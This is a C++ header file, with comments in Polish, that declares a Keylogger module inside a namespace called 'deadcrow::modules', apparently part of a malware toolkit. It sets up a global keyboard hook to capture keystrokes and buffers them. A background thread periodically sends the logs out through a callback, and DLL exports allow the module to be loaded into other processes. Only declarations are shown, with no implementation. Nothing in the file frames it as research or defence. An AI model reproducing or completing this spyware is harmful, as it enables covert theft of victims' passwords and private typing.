#pragma once

#include <string>
#include <vector>
#include <functional>
#include <windows.h>

namespace deadcrow {
namespace modules {

class Keylogger {
public:
    // Konstruktor
    Keylogger();
    
    // Destruktor
    ~Keylogger();
    
    // Rozpoczęcie logowania klawiszy
    bool start();
    
    // Zatrzymanie logowania klawiszy
    void stop();
    
    // Pobranie zalogowanych klawiszy
    std::string getKeyLogs();
    
    // Wyczyszczenie zalogowanych klawiszy
    void clearKeyLogs();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie callbacka do wysyłania logów
    void setLogCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie interwału wysyłania logów (w sekundach)
    void setLogInterval(int seconds);
    
    // Sprawdzenie, czy keylogger jest aktywny
    bool isActive() const;
    
    // Funkcja eksportowana dla DLL
    static BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    
private:
    // Flaga aktywności
    bool active_;
    
    // Bufor na zalogowane klawisze
    std::string key_buffer_;
    
    // Mutex do synchronizacji dostępu do bufora
    HANDLE buffer_mutex_;
    
    // Hook klawiatury
    HHOOK keyboard_hook_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Callback do wysyłania logów
    std::function<void(const std::string&)> log_callback_;
    
    // Interwał wysyłania logów (w sekundach)
    int log_interval_;
    
    // Wątek wysyłania logów
    HANDLE log_thread_;
    
    // Flaga zatrzymania wątku
    bool stop_thread_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Procedura hooka klawiatury
    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Konwersja kodu klawisza na tekst
    static std::string keyCodeToString(DWORD key_code, bool shift_pressed);
    
    // Funkcja wątku wysyłania logów
    static DWORD WINAPI logThreadProc(LPVOID param);
    
    // Instancja keyloggera (dla callbacka)
    static Keylogger* instance_;
};

// Funkcja eksportowana dla DLL
extern "C" __declspec(dllexport) bool StartKeylogger();
extern "C" __declspec(dllexport) void StopKeylogger();
extern "C" __declspec(dllexport) const char* GetKeyLogs();
extern "C" __declspec(dllexport) void ClearKeyLogs();

} // namespace modules
} // namespace deadcrow
